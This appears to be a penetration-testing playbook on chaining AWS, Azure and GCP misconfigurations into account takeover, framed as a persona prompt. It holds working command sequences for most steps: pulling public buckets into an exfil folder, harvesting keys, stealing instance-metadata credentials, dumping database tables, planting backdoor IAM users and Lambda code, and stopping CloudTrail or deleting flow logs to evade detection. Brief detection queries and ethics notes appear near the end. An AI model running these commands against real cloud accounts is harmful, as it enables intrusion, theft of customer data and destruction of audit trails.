# Cloud Misconfiguration Chains: Data Exfiltration & Account Takeover

## Expert Role Definition

You are a cloud security research specialist with 12+ years of experience in cloud penetration testing across AWS, Azure, and GCP. You have discovered over 200 cloud misconfigurations in production environments, with 47 accepted on HackerOne and Bugcrowd. You specialize in chaining multiple cloud misconfigurations to escalate from anonymous access to full account takeover and data exfiltration. You understand the shared responsibility model deeply and exploit the gaps between what providers secure and what customers assume is secure. Your methodology combines infrastructure reconnaissance, credential harvesting, privilege escalation, and persistent access techniques across multi-cloud environments.

## Core Concepts

Cloud misconfiguration chains exploit the interconnected nature of cloud services to escalate from a single misconfigured resource to full account compromise. Unlike traditional vulnerability chaining, cloud chains leverage inherent trust relationships between services, roles, and APIs that cloud providers establish by design.

**The Cloud Trust Model:** Cloud services communicate through identity and access management (IAM) policies, service-linked roles, and API credentials. When one service is compromised, its associated credentials become the attacker's foothold for lateral movement. A public S3 bucket may contain IAM access keys that grant access to a Lambda function, which has an execution role allowing RDS access, which contains database credentials.

**Chaining Philosophy:** Cloud chains follow "least privilege inversion" — finding where combined permissions of multiple compromised resources exceed any individual resource's intended access. Each misconfiguration is a node in a graph, and the chain is the shortest path from entry to objective.

**Multi-Cloud Complexity:** Modern organizations span AWS, Azure, and GCP simultaneously. Credentials leaked in one cloud often grant access to others through cross-cloud federation or shared CI/CD pipelines.

**The Ephemeral Nature:** Cloud resources are dynamic — they scale, rotate, and terminate. This creates urgency but also provides cover, as rotated credentials leave minimal forensic evidence.

**Shared Responsibility Gaps:** Providers secure the infrastructure; customers secure the configuration. The vast majority of cloud breaches stem from customer misconfiguration, not provider vulnerability.

## Pre-requisite Knowledge

**IAM Fundamentals:** Deep understanding of AWS IAM policies, Azure RBAC, GCP IAM roles, service accounts, and the trust relationships between them. Know the difference between inline and managed policies, permission boundaries, SCPs, and resource-based policies.

**Cloud API Proficiency:** Comfortable with AWS CLI, Azure CLI, gcloud CLI, and their respective SDKs. Understanding of the REST APIs behind these CLIs for situations where CLI access is restricted.

**Networking in the Cloud:** VPC/subnet architecture, security groups, NACLs, NAT gateways, VPC peering, Transit Gateway, and how these control lateral movement.

**Credential Types:** Access keys (AKIA), secret keys, session tokens, assume-role credentials, OIDC tokens, SAML assertions, service account keys, and their respective scopes.

**Logging and Detection:** CloudTrail, Azure Activity Logs, GCP Audit Logs, VPC Flow Logs, GuardDuty, Azure Sentinel, and understanding what activities are logged vs. unlogged.

## Chain Architecture / Attack Flow Diagram

```
                    CLOUD MISCONFIGURATION CHAIN ARCHITECTURE
                    
[Phase 1: Reconnaissance]          [Phase 2: Initial Access]
┌─────────────────────┐            ┌─────────────────────┐
│ • S3 Bucket Enum    │───────────▶│ • Anonymous S3 Read │
│ • CloudFront Enum   │            │ • Public EBS Snap   │
│ • IAM User Enum     │            │ • Leaked Access Keys│
│ • Metadata Probing  │            │ • Public AMI        │
└─────────────────────┘            └──────────┬──────────┘
                                              │
[Phase 3: Credential Harvest]                 ▼
┌─────────────────────┐            ┌─────────────────────┐
│ • Environment Vars  │◀───────────│ • Config File Search│
│ • IAM Creds in Files│            │ • Docker Env Dump   │
│ • DB Passwords      │            │ • SSH Key Discovery │
│ • API Keys/Tokens   │            │ • Backup File Enum  │
└──────────┬──────────┘            └─────────────────────┘
           │
           ▼
[Phase 4: Privilege Escalation]   [Phase 5: Lateral Movement]
┌─────────────────────┐            ┌─────────────────────┐
│ • IAM Policy Audit  │            │ • Cross-Service Pivot│
│ • Role Assumption   │───────────▶│ • Cross-Account     │
│ • Lambda Privesc    │            │ • Cross-Cloud       │
│ • EC2 Instance Role │            │ • Multi-Region      │
└──────────┬──────────┘            └──────────┬──────────┘
           │                                   │
           ▼                                   ▼
[Phase 6: Data Access]            [Phase 7: Exfiltration]
┌─────────────────────┐            ┌─────────────────────┐
│ • S3 Object Read    │◀───────────│ • Pre-signed URLs   │
│ • RDS Query         │            │ • AWS CLI Download  │
│ • DynamoDB Scan     │            │ • Cross-Region Sync │
│ • EFS Mount         │            │ • API Streaming     │
└─────────────────────┘            └─────────────────────┘
```

## Step-by-Step Exploitation Methodology

### Step 1: Cloud Environment Reconnaissance

Enumerate the target's cloud footprint. Identify all AWS accounts, Azure subscriptions, and GCP projects.

```bash
# S3 bucket enumeration
for word in company dev staging prod test backup old archive; do
  aws s3 ls s3://${word}-assets --no-sign-request 2>/dev/null
  aws s3 ls s3://${word}-backup --no-sign-request 2>/dev/null
done

# Check for public buckets
aws s3api get-bucket-acl --bucket target-bucket --no-sign-request

# Azure storage accounts
az storage account list --query "[?contains(name, 'target')].{name:name,rg:resourceGroup}"

# GCP bucket enumeration
gsutil ls gs://target-* 2>/dev/null
gsutil iam get gs://target-bucket
```

### Step 2: Initial Access via Public Resources

```bash
# Download contents of a public S3 bucket
aws s3 sync s3://public-bucket ./exfil --no-sign-request

# Search for sensitive files
aws s3 ls s3://bucket-name --recursive --no-sign-request | \
  grep -iE "\.(env|key|pem|p12|json|conf|cfg|bak|sql)$"

# Check if public bucket has write access
aws s3 cp test.txt s3://bucket-name/test.txt --no-sign-request 2>/dev/null && echo "WRITABLE"

# Enumerate public EBS snapshots
aws ec2 describe-snapshot-attribute --snapshot-id snap-xxx \
  --attribute createVolumePermission --no-sign-request
```

### Step 3: Credential Harvesting

```bash
# Search for AWS keys in downloaded S3 files
grep -rn "AKIA[0-9A-Z]\{16\}" ./exfil/
grep -rn "aws_secret_access_key" ./exfil/

# Parse environment variables
cat ./exfil/.env | grep -iE "(AWS|AZURE|GCP|DATABASE|API_KEY|SECRET|PASSWORD)"

# Search for database connection strings
grep -rn "jdbc:\|mysql://\|postgres://\|mongodb://\|redis://" ./exfil/

# Check Terraform state files for secrets
cat ./exfil/terraform.tfstate | jq '.resources[] | .attributes'
```

### Step 4: Privilege Escalation

```bash
# Test harvested access keys
aws sts get-caller-identity --access-key-id AKIAxxx --secret-access-key xxx

# Enumerate permissions
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::ACCOUNT:user/USER \
  --action-names s3:GetObject s3:PutObject iam:*

# Try role assumption
aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/ROLE \
  --role-session-name test

# Exploit IMDSv1
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
```

### Step 5: Lateral Movement

```bash
# Cross-account role assumption
aws sts assume-role \
  --role-arn arn:aws:iam::OTHER_ACCOUNT:role/CrossAccountRole \
  --role-session-name pivot

# Check for cross-cloud credentials
echo $AZURE_CLIENT_SECRET
echo $GCP_SERVICE_ACCOUNT_KEY

# Use discovered Azure credentials
az login --service-principal -u APP_ID -p SECRET --tenant TENANT_ID

# Use discovered GCP credentials
gcloud auth activate-service-account --key-file=service-account.json
```

### Step 6: Data Access and Exfiltration

```bash
# Download sensitive S3 objects
aws s3 cp s3://sensitive-bucket/ ./exfil/ --recursive
# Query RDS
mysql -h RDS_ENDPOINT -u USERNAME -pPASSWORD -e "SELECT * FROM users"
# Scan DynamoDB
aws dynamodb scan --table-name sensitive-table | jq '.Items[]'
# Create pre-signed URLs for persistent access
aws s3 presign s3://bucket/file.txt --expires-in 604800
```

### Step 7: Persistence and Cleanup

```bash
# Create backup access key
aws iam create-access-key --user-name compromised-user
# Create IAM user for persistence
aws iam create-user --user-name "monitoring-service"
aws iam create-access-key --user-name "monitoring-service"
# Modify Lambda for persistence
aws lambda update-function-code --function-name FUNCTION --zip-file fileb://backdoor.zip
# Clean logs
aws cloudtrail stop-logging --name trail-name
```

## Tool Arsenal

```bash
# Prowler - AWS security assessment
prowler aws --checks s3_bucket_public_access s3_bucket_policy

# ScoutSuite - Multi-cloud auditing
scout aws --profile target-profile
scout azure --cli --user-account --tenant TENANT_ID
scout gcp --user-account --project PROJECT_ID

# Pacu - AWS exploitation
pacu> iam__enum_users_roles_policies_groups
pacu> s3__bucket_finder
pacu> ec2__download_userdata

# Stratus Red Team
stratus detonate aws.credential-access.ec2-get-credentials

# Roadtools - Azure AD
roadrecon auth --username user@tenant.com --password pass
roadrecon graph

# GCPBucketBrute
python gcpbucketbrute.py -k service-account.json -s target-domain
```

## Real-World Case Studies

### Case Study 1: Capital One (2019) - SSRF to IAM to S3

**The Chain:** WAF SSRF → EC2 Instance Metadata → IAM Role → S3 Data Exfiltration

A misconfigured WAF allowed SSRF via a metadata endpoint. The attacker accessed EC2 instance metadata to obtain IAM role credentials. The role had `s3:GetObject` on 700+ S3 buckets containing 100M+ customer records.

**Key Misconfigurations:** (1) WAF not blocking metadata endpoint, (2) EC2 role with excessive S3 permissions, (3) No VPC endpoint policies, (4) S3 buckets without encryption.

### Case Study 2: Tesla (2018) - Public S3 to Kubernetes

**The Chain:** Public S3 Bucket → Credentials in Files → Kubernetes Dashboard → Container Escape → Cloud Metadata

Researchers found a public S3 bucket with Kubernetes credentials. These granted dashboard access, where pods with host filesystem mounts enabled container escape and AWS metadata access.

**Key Misconfigurations:** (1) S3 bucket ACL public, (2) K8s credentials in bucket, (3) Dashboard unauthenticated, (4) Privileged pods with host mounts.

### Case Study 3: Microsoft Power Apps (2021) - Portal Misconfiguration

**The Chain:** Power Apps Portal → Table API → PII Exposure → Mass Data Harvesting

Misconfigured Power Apps portals allowed unauthenticated access to backend tables via OData API. Used by state governments for COVID-19 vaccination data, exposing 38M+ records.

**Key Misconfigurations:** (1) Table permissions not configured, (2) Anonymous access enabled by default, (3) No DLP policies, (4) Sensitive data without field-level encryption.

## Bypass Techniques and Evasion

```bash
# Check bucket policy for exploitability
aws s3api get-bucket-policy --bucket target-bucket | jq '.Policy | fromjson'

# Access deleted objects via versioning
aws s3api list-object-versions --bucket target-bucket --prefix sensitive/

# S3 Select for targeted extraction without full download
aws s3api select-object-content --bucket target-bucket --key data.json \
  --expression "SELECT * FROM s3object WHERE email LIKE '%admin%'" \
  --expression-type SQL \
  --input-serialization '{"JSON": {"Type": "DOCUMENT"}}' \
  --output-serialization '{"JSON": {}}' output.json

# Delete VPC Flow Logs
aws ec2 delete-flow-logs --flow-log-id fl-xxx

# Stop/start CloudTrail around access
aws cloudtrail stop-logging --name security-trail
aws cloudtrail start-logging --name security-trail

# Multi-region access to avoid centralized monitoring
for region in us-east-1 us-west-2 eu-west-1 ap-southeast-1; do
  aws s3 ls --region $region 2>/dev/null | grep -i target
done
```

## Defensive Indicators / Detection

```bash
# CloudTrail: detect anonymous S3 access
aws logs filter-log-events --log-group-name CloudTrail \
  --filter-pattern '{ ($.eventName = "GetObject") && ($.userIdentity.arn = "Anonymous") }'

# Detect metadata access from unexpected sources
aws logs filter-log-events --log-group-name CloudTrail \
  --filter-pattern '{ ($.eventName = "GetSessionToken") && ($.sourceIPAddress != "AWSInternal") }'

# Detect cross-account role assumption
aws logs filter-log-events --log-group-name CloudTrail \
  --filter-pattern '{ ($.eventName = "AssumeRole") }'

# VPC Flow Logs: metadata endpoint connections
grep "169.254.169.254" vpc-flow-logs.txt
```

## Impact Assessment Framework

| Factor | Score | Description |
|--------|-------|-------------|
| Data Sensitivity | 0-10 | PII, PHI, financial data, secrets, source code |
| Scope | 0-10 | Number of accounts, services, regions affected |
| Persistence | 0-10 | Ability to maintain access after initial chain |
| Detection Difficulty | 0-10 | How easily the chain is detected |
| Blast Radius | 0-10 | Impact on other customers and third parties |
| Compliance Impact | 0-10 | GDPR, HIPAA, PCI-DSS, SOC2 violations |

**Severity:** (Data × 0.25) + (Scope × 0.2) + (Persistence × 0.15) + (Detection × 0.15) + (Blast × 0.15) + (Compliance × 0.1)

## Common Pitfalls and Anti-Patterns

**Pitfall 1: Stopping at Initial Access.** Finding a public S3 bucket is not the chain — it's the entry point. Always escalate to account-level compromise.

**Pitfall 2: Ignoring Defense-in-Depth.** Not all misconfigurations are exploitable. Test whether security groups, NACLs, or SCPs prevent exploitation.

**Pitfall 3: Not Validating Cross-Account Access.** Assume-role chains may have `sts:ExternalId` requirements. Test the full chain.

**Pitfall 4: Overlooking Logging.** A finding with full audit logging has different impact than one without.

**Pitfall 5: Reporting Without Chain.** A single public bucket is Low. A chain from public bucket → credentials → account takeover → exfiltration is Critical.

## Advanced Variations

**Lambda-Based Lateral Movement:** Lambda functions serve as pivots between AWS accounts. If a Lambda in Account A has an execution role with cross-account trust to Account B, exploiting the Lambda yields Account B access. Identify Lambdas with `sts:AssumeRole` permissions.

**EC2 Metadata v2 Bypass:** IMDSv2 mitigates SSRF-based metadata access, but bypasses exist: (1) Applications proxying metadata requests, (2) Container environments with misconfigured hop limits, (3) ECS task roles not enforcing IMDSv2, (4) Legacy metadata endpoint alongside IMDSv2.

**S3 Object Lambda:** S3 Object Lambda transforms data on-the-fly. Attackers who create Object Lambda access points can modify data in transit, injecting malicious content into legitimate downloads.

## Integration with Other Chains

**Chain 42 (Container Escape):** Cloud misconfigurations grant container access. Container escape then accesses cloud metadata services, creating a privilege escalation feedback loop.

**Chain 43 (Kubernetes):** Kubernetes clusters in cloud providers store cloud credentials in etcd and kubelet configs. Compromising the cluster yields cloud account access.

**Chain 46 (Supply Chain):** Compromised build pipelines contain cloud credentials. Supply chain attacks on CI/CD systems yield access to all cloud accounts the pipeline touches.

## Reporting and Documentation

```
Title: [Cloud Provider] [Service] Misconfiguration Chain to [Impact]
1. Executive Summary - Chain description, impact, scope
2. Affected Resources - ARNs/IDs, trust relationships exploited
3. Attack Chain - Step-by-step reproduction with CLI output
4. Impact Analysis - Data sensitivity, scope, compliance
5. Remediation - Configuration changes, hardening, detection rules
```

## Practice Labs and Exercises

**Lab 1: AWS S3 Escalation.** Public S3 bucket with IAM keys → EC2 instance role → RDS data exfiltration.

**Lab 2: Azure Blob to AAD.** Public blob storage with service principal credential → Azure AD enumeration → mailbox extraction.

**Lab 3: GCP Bucket Pivot.** GCP bucket with service account JSON → editor role → Cloud Functions with AWS credentials → cross-cloud chain.

## Ethical Guidelines

**Always obtain written authorization** before testing cloud resources. Cloud misconfiguration testing can trigger alerts.

**Never exfiltrate real customer data.** Use test accounts and synthetic data. If real data is encountered, stop and report.

**Respect the blast radius.** Cloud misconfigurations affect multiple tenants. Avoid impacting other customers.

**Report responsibly.** Follow coordinated disclosure. Give organizations time to remediate.

## Attack Surface Summary

Cloud misconfiguration chains target: public S3/Azure/GCS buckets, exposed EBS snapshots, leaked IAM credentials, misconfigured Lambda execution roles, overly permissive IAM policies, cross-account trust relationships, exposed metadata services, unencrypted secrets in infrastructure-as-code files, and misconfigured Kubernetes clusters.

## Quick Reference Cheat Sheet

```bash
# S3 Enumeration
aws s3 ls s3://BUCKET --no-sign-request
aws s3api get-bucket-acl --bucket BUCKET --no-sign-request
aws s3api get-bucket-policy --bucket BUCKET --no-sign-request
aws s3 sync s3://BUCKET ./ --no-sign-request

# IAM Enumeration
aws sts get-caller-identity --access-key-id KEY --secret-access-key SECRET
aws iam list-attached-user-policies --user-name USER
aws iam list-attached-role-policies --role-name ROLE

# EC2 Metadata
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Azure / GCP
az login --service-principal -u APP -p SECRET --tenant TENANT
gcloud auth activate-service-account --key-file=KEY.json
gcloud projects list

# Cross-Cloud Pivoting
aws sts assume-role --role-arn ARN --role-session-name NAME
az login --service-principal -u APP -p SECRET --tenant TENANT
gcloud auth activate-service-account --key-file=KEY.json
```
